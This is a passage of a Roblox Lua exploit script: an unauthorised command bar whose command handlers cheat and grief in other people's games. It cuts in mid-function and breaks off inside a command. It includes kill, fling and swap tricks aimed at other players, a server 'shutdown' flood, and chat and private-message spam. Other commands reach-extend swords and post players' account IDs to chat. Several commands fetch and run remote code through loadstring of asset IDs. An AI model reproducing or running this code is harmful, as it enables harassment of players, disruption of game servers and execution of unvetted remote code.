                    game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Humanoid
                else
                    game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("unview") then
            if lplayer.Character.Humanoid then
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
            else
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
            end
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("goto ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            end
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("fly") then
        repeat wait() until lplayer and lplayer.Character and lplayer.Character:FindFirstChild('HumanoidRootPart') and lplayer.Character:FindFirstChild('Humanoid')
        repeat wait() until Mouse
       
        local T = lplayer.Character.HumanoidRootPart
        local CONTROL = {F = 0, B = 0, L = 0, R = 0}
        local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
        local SPEED = speedget
       
        local function fly()
            flying = true
            local BG = Instance.new('BodyGyro', T)
            local BV = Instance.new('BodyVelocity', T)
            BG.P = 9e4
            BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
            BG.cframe = T.CFrame
            BV.velocity = Vector3.new(0, 0.1, 0)
            BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
            spawn(function()
            repeat wait()
            lplayer.Character.Humanoid.PlatformStand = true
            if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
            SPEED = 50
            elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
            SPEED = 0
            end
            if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
            BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
            lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
            elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
            BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
            else
            BV.velocity = Vector3.new(0, 0.1, 0)
            end
            BG.cframe = workspace.CurrentCamera.CoordinateFrame
                    until not flying
                    CONTROL = {F = 0, B = 0, L = 0, R = 0}
                    lCONTROL = {F = 0, B = 0, L = 0, R = 0}
                    SPEED = 0
                    BG:destroy()
                    BV:destroy()
                    lplayer.Character.Humanoid.PlatformStand = false
                end)
            end
        Mouse.KeyDown:connect(function(KEY)
            if KEY:lower() == 'w' then
                CONTROL.F = speedfly
            elseif KEY:lower() == 's' then
                CONTROL.B = -speedfly
            elseif KEY:lower() == 'a' then
                CONTROL.L = -speedfly
            elseif KEY:lower() == 'd' then
                CONTROL.R = speedfly
            end
        end)
        Mouse.KeyUp:connect(function(KEY)
            if KEY:lower() == 'w' then
                CONTROL.F = 0
            elseif KEY:lower() == 's' then
                CONTROL.B = 0
            elseif KEY:lower() == 'a' then
                CONTROL.L = 0
            elseif KEY:lower() == 'd' then
                CONTROL.R = 0
            end
        end)
        fly()
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("unfly") then
            flying = false
            lplayer.Character.Humanoid.PlatformStand = false
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("chat ") then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer((string.sub(CMDBAR.Text, 6)), "All")
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("spam ") then
            spamtext = (string.sub(CMDBAR.Text, 6))
            spamming = true
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("unspam") then
            spamming = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("spamwait ") then
            spamdelay = (string.sub(CMDBAR.Text, 10))
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("pmspam ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                pmspammed = v.Name
                spammingpm = true
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("unpmspam") then
            spammingpm = false
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("cfreeze ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 9))) do
                v.Character["Left Leg"].Anchored = true
                v.Character["Left Arm"].Anchored = true
                v.Character["Right Leg"].Anchored = true
                v.Character["Right Arm"].Anchored = true
                v.Character.Torso.Anchored = true
                v.Character.Head.Anchored = true
            end
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("uncfreeze ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 11))) do
                v.Character["Left Leg"].Anchored = false
                v.Character["Left Arm"].Anchored = false
                v.Character["Right Leg"].Anchored = false
                v.Character["Right Arm"].Anchored = false
                v.Character.Torso.Anchored = false
                v.Character.Head.Anchored = false
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("unlockws") then
            local a = game:GetService("Workspace"):getChildren()
            for i = 1, #a do
                if a[i].className == "Part" then
                    a[i].Locked = false
                elseif a[i].className == "Model" then
                    local r = a[i]:getChildren()
                    for i = 1, #r do
                        if r[i].className == "Part" then
                        r[i].Locked = false
                        end
                    end
                end
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Success!";
            Text = "Workspace unlocked. Use ;lockws to lock.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("lockws") then
            local a = game:GetService("Workspace"):getChildren()
            for i = 1, #a do
                if a[i].className == "Part" then
                    a[i].Locked = true
                elseif a[i].className == "Model" then
                    local r = a[i]:getChildren()
                    for i = 1, #r do
                        if r[i].className == "Part" then
                        r[i].Locked = true
                        end
                    end
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("btools") then
            local Clone_T = Instance.new("HopperBin",lplayer.Backpack)
            Clone_T.BinType = "Clone"
            local Destruct = Instance.new("HopperBin",lplayer.Backpack)
            Destruct.BinType = "Hammer"
            local Hold_T = Instance.new("HopperBin",lplayer.Backpack)
            Hold_T.BinType = "Grab"
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("pstand") then
            lplayer.Character.Humanoid.PlatformStand = true
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("unpstand") then
            lplayer.Character.Humanoid.PlatformStand = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("blockhead") then
            lplayer.Character.Head.Mesh:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("sit") then
            lplayer.Character.Humanoid.Sit = true
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("bringobj ") then
            local function bringobjw()
            for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
            if obj.Name == (string.sub(CMDBAR.Text, 10)) then
            obj.CFrame = lplayer.Character.HumanoidRootPart.CFrame
            obj.CanCollide = false
            obj.Transparency = 0.7
            wait()
            obj.CFrame = lplayer.Character["Left Leg"].CFrame
            wait()
            obj.CFrame = lplayer.Character["Right Leg"].CFrame
            wait()
            obj.CFrame = lplayer.Character["Head"].CFrame
            end
            end
            end
            while wait() do
                bringobjw()
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BringObj";
            Text = "BringObj enabled.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("wsvis ") then
            vis = (string.sub(CMDBAR.Text, 7))
            local a = game:GetService("Workspace"):GetDescendants()
            for i = 1, #a do
                if a[i].className == "Part" then
                    a[i].Transparency = vis
                elseif a[i].className == "Model" then
                    local r = a[i]:getChildren()
                    for i = 1, #r do
                        if r[i].className == "Part" then
                        r[i].Transparency = vis
                        end
                    end
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("hypertotal") then
            loadstring(game:GetObjects("rbxassetid://1255063809")[1].Source)()
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Success!";
            Text = "HyperTotal GUI Loaded!";
            })
        end
        if string.sub(CMDBAR.Text, 1, 4) == ("cmds") then
            CMDSFRAME.Visible = true
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("rmeshhats") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                    v.Handle.Mesh:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("blockhats") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                    v.Handle.Mesh:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("rmeshtool") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Tool")) then
                    v.Handle.Mesh:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("blocktool") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Tool")) then
                    v.Handle.Mesh:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("spinner") then
            local p = Instance.new("RocketPropulsion")
            p.Parent = lplayer.Character.HumanoidRootPart
            p.Name = "Spinner"
            p.Target = lplayer.Character["Left Arm"]
            p:Fire()
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Spinner enabled";
            Text = "Type ;nospinner to disable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("nospinner") then
            lplayer.Character.HumanoidRootPart.Spinner:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("reachd") then
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
                if v:isA("Tool") then
                    local a = Instance.new("SelectionBox",v.Handle)
                    a.Adornee = v.Handle
                    v.Handle.Size = Vector3.new(0.5,0.5,60)
                    v.GripPos = Vector3.new(0,0,0)
                    lplayer.Character.Humanoid:UnequipTools()
                end
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Reach applied!";
            Text = "Applied to equipped sword. Use ;noreach to disable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("reach ") then
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
                if v:isA("Tool") then
                    local a = Instance.new("SelectionBox",v.Handle)
                    a.Name = "Reach"
                    a.Adornee = v.Handle
                    v.Handle.Size = Vector3.new(0.5,0.5,(string.sub(CMDBAR.Text, 7)))
                    v.GripPos = Vector3.new(0,0,0)
                    lplayer.Character.Humanoid:UnequipTools()
                end
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Reach applied!";
            Text = "Applied to equipped sword. Use ;noreach to disable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("noreach") then
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
                if v:isA("Tool") then
                    v.Handle.Reach:Destroy()
                end
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Reach removed!";
            Text = "Removed reach from equipped sword.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("rkill ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7)))do
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                wait(0.1)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.2)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.5)
                lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("tp me ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("cbring ") then
            if (string.sub(CMDBAR.Text, 8)) == "all" or (string.sub(CMDBAR.Text, 8)) == "All" or (string.sub(CMDBAR.Text, 8)) == "ALL" then
                cbringall = true
            else
                for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                    brplr = v.Name
                end
            end
            cbring = true
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("uncbring") then
            cbring = false
            cbringall = false
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("swap ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                local NOWPLR = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                local NOW = lplayer.Character.HumanoidRootPart.CFrame
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                local function tp(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1:MoveTo(char2.Head.Position)
                end
                end
                wait(0.1)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.2)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.5)
                lplayer.Character.HumanoidRootPart.CFrame = NOW
                wait(0.6)
                tp(lplayer, game:GetService("Players")[v.Name])
                wait(0.4)
                lplayer.Character.HumanoidRootPart.CFrame = NOWPLR
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("glitch ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
                wait(0.3)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
                wait(0.4)
                b = Instance.new("BodyForce")
                b.Parent = lplayer.Character.HumanoidRootPart
                b.Name = "Glitch"
                b.Force = Vector3.new(100000000,5000,0)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("unglitch") then
            lplayer.Character.HumanoidRootPart.Glitch:Destroy()
            lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(10000,0,10000)
            b = Instance.new("BodyForce")
            b.Parent = lplayer.Character.HumanoidRootPart
            b.Name = "unGlitch"
            b.Force = Vector3.new(0,-5000000,0)
            wait(2)
            lplayer.Character.HumanoidRootPart.unGlitch:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("grespawn") then
            lplayer.Character.Humanoid.Health = 0
            wait(1)
            lplayer.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
            lplayer.Character.Torso.CFrame = CFrame.new(1000000,0,1000000)
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("explorer") then
            loadstring(game:GetObjects("rbxassetid://492005721")[1].Source)()
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Success!";
            Text = "DEX Explorer has loaded.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("anim ") then
            local Anim = Instance.new("Animation")
            Anim.AnimationId = "rbxassetid://"..(string.sub(CMDBAR.Text, 6))
            local track = lplayer.Character.Humanoid:LoadAnimation(Anim)
            track:Play(.1, 1, 1)
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("animgui") then
            loadstring(game:GetObjects("rbxassetid://1202558084")[1].Source)()
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Success!";
            Text = "Energize Animations GUI has loaded.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("savepos") then
            saved = lplayer.Character.HumanoidRootPart.CFrame
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Position Saved";
            Text = "Use ;loadpos to return to saved position.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("loadpos") then
            lplayer.Character.HumanoidRootPart.CFrame = saved
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("bang ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                local Anim2 = Instance.new("Animation")
                Anim2.AnimationId = "rbxassetid://148840371"
                local track2 = lplayer.Character.Humanoid:LoadAnimation(Anim2)
                track2:Play(.1, 1, 1)
                bplrr = v.Name
                banpl = true
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("unbang") then
            banpl = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("bringmod ") then
            local function bringmodw()
            for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
            if obj.Name == (string.sub(CMDBAR.Text, 10)) then
            for i,ch in pairs(obj:GetDescendants()) do
            if (ch:IsA("BasePart")) then
            ch.CFrame = lplayer.Character.HumanoidRootPart.CFrame
            ch.CanCollide = false
            ch.Transparency = 0.7
            wait()
            ch.CFrame = lplayer.Character["Left Leg"].CFrame
            wait()
            ch.CFrame = lplayer.Character["Right Leg"].CFrame
            wait()
            ch.CFrame = lplayer.Character["Head"].CFrame
            end
            end
            end
            end
            end
            while wait() do
                bringmodw()
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BringMod";
            Text = "BringMod enabled.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("respawn") then
            local mod = Instance.new('Model', workspace) mod.Name = 're '..lplayer.Name
            local hum = Instance.new('Humanoid', mod)
            local ins = Instance.new('Part', mod) ins.Name = 'Torso' ins.CanCollide = false ins.Transparency = 1
            lplayer.Character = mod
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("shutdown") then
            game:GetService'RunService'.Stepped:Connect(function()
            pcall(function()
                for i,v in pairs(game:GetService'Players':GetPlayers()) do
                    if v.Character ~= nil and v.Character:FindFirstChild'Head' then
                        for _,x in pairs(v.Character.Head:GetChildren()) do
                            if x:IsA'Sound' then x.Playing = true x.CharacterSoundEvent:FireServer(true, true) end
                        end
                    end
                end
            end)
            end)
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Attempting Shutdown";
            Text = "Shutdown Attempt has begun.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("delobj ") then
            objtodel = (string.sub(CMDBAR.Text, 8))
            for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
                if v.Name == objtodel then
                    v:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("getplrs") then
            for i,v in pairs(game:GetService("Players"):GetPlayers())do
                print(v)
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Printed";
            Text = "Players have been printed to console. (F9)";
            })
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("deldecal") then
            for i,v in pairs(game:GetService("Workspace"):GetDescendants())do
                if (v:IsA("Decal")) then
                    v:Destroy()
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("opfinality") then
            loadstring(game:GetObjects("rbxassetid://1294358929")[1].Source)()
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Success!";
            Text = "OpFinality GUI has loaded.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("remotes") then
            remotes = true
            added = true
            game.DescendantAdded:connect(function(rmt)
            if added == true then
            if remotes == true then
            if rmt:IsA("RemoteEvent") then
            print("A RemoteEvent was added!")
            print(" game." .. rmt:GetFullName() .. " | RemoteEvent")
            print(" game." .. rmt:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
            end end end
            end)
            game.DescendantAdded:connect(function(rmtfnctn)
            if added == true then
            if remotes == true then
            if rmtfnctn:IsA("RemoteFunction") then
            warn("A RemoteFunction was added!")
            warn(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction")
            print(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
            end end end
            end)
           
            game.DescendantAdded:connect(function(bndfnctn)
            if added == true then
            if binds == true then
            if bndfnctn:IsA("BindableFunction") then
            print("A BindableFunction was added!")
            print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction")
            print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
            end end end
            end)
           
            game.DescendantAdded:connect(function(bnd)
            if added == true then
            if binds == true then
            if bnd:IsA("BindableEvent") then
            warn("A BindableEvent was added!")
            warn(" game." .. bnd:GetFullName() .. " | BindableEvent")
            print(" game." .. bnd:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
            end end end
            end)
           
           
            if binds == true then
            for i,v in pairs(game:GetDescendants()) do
            if v:IsA("BindableFunction") then
            print(" game." .. v:GetFullName() .. " | BindableFunction")
            print(" game." .. v:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
            end end
            for i,v in pairs(game:GetDescendants()) do
            if v:IsA("BindableEvent") then
            warn(" game." .. v:GetFullName() .. " | BindableEvent")
            print(" game." .. v:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
            end end
            else
            print("Off")
            end
            if remotes == true then
            for i,v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteFunction") then
            warn(" game." .. v:GetFullName() .. " | RemoteFunction")
            print(" game." .. v:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
            end end
            wait()
            for i,v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteEvent") then
            print(" game." .. v:GetFullName() .. " | RemoteEvent")
            print(" game." .. v:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
            end end
            else
            print("Off")
            end
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Printing Remotes";
            Text = "Type ;noremotes to disable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("noremotes") then
            remotes = false
            added = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Printing Remotes Disabled";
            Text = "Type ;remotes to enable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("tpdefault") then
            spin = false
            followed = false
            traill = false
            noclip = false
            annoying = false
            hwalk = false
            cbringing = false
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("stopsit") then
            stopsitting = true
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("gosit") then
            stopsitting = false
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("version") then
            print(adminversion)
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Version";
            Text = adminversion;
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("clicktp") then
            clickgoto = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Click TP";
            Text = "Press E to teleport to mouse position";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("noclicktp") then
            clickgoto = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Click TP";
            Text = "Click TP has been disabled.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("toolson") then
            gettingtools = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools Enabled";
            Text = "Automatically colleting tools dropped.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("toolsoff") then
            gettingtools = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools Disabled";
            Text = "Click TP has been disabled.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("delcmdbar") then
            ScreenGui:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("reset") then
            lplayer.Character.Head:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("state ") then
            statechosen = string.sub(CMDBAR.Text, 7)
            changingstate = true
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("gravity ") then
            game:GetService("Workspace").Gravity = string.sub(CMDBAR.Text, 9)
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("looprhats") then
        removingmeshhats = true
        end
        if string.sub(CMDBAR.Text, 1, 11) == ("unlooprhats") then
            removingmeshhats = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("looprtool") then
            removingmeshtool = true
        end
        if string.sub(CMDBAR.Text, 1, 11) == ("unlooprtool") then
            removingmeshtool = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("givetool ") then
            for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
                if v:IsA("Tool") then
                    for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
                        v.Parent = player.Character
                    end
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 4) == ("age ") then
            for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 5))) do
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account Age: "..player.AccountAge.." days!", "All")
            end
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("id ") then
            for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 4))) do
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account ID: "..player.UserId, "All")
            end
        end
        if string.sub(CMDBAR.Text, 1, 5) == (".age ") then
            for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = player.AccountAge.." Days";
                Text = "Account age of "..player.Name;
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 4) == (".id ") then
            for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 5))) do
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = player.UserId.." ID";
                Text = "Account ID of "..player.Name;
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("gameid") then
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Game ID";
            Text = "Game ID: ".. game.GameId;
            })
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("pgs") then
            local pgscheck = game:GetService("Workspace"):PGSIsEnabled()
            if pgscheck == true then
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "PGSPhysicsSolverEnabled";
                Text = "PGS is Enabled!";
                })
            else
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "PGSPhysicsSolverEnabled";
                Text = "PGS is Disabled!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 11) == ("removeinvis") then
            for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
                if v:IsA("Part") then
                    if v.Transparency == 1 then
                        if v.Name ~= "HumanoidRootPart" then
                            v:Destroy()
                        end
                    end
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("removefog") then
            game:GetService("Lighting").FogStart = 0
            game:GetService("Lighting").FogEnd = 9999999999999
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("disable") then
            lplayer.Character.Humanoid.Parent = lplayer
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("enable") then
            lplayer.Humanoid.Parent = lplayer.Character
        end
        if string.sub(CMDBAR.Text, 1, 13) == ("givealltools ") then
            for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetDescendants()) do
                if v:IsA("Tool") then
                    v.Parent = lplayer.Character
                    wait()
                    for i,player in pairs(GetPlayer(string.sub(CMDBAR.Text, 14))) do
                        v.Parent = player.Character
                    end
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("flyspeed ") then
            speedfly = string.sub(CMDBAR.Text, 10)
            wait()
            change()
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("carpet ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                local Anim3 = Instance.new("Animation")
                Anim3.AnimationId = "rbxassetid://282574440"
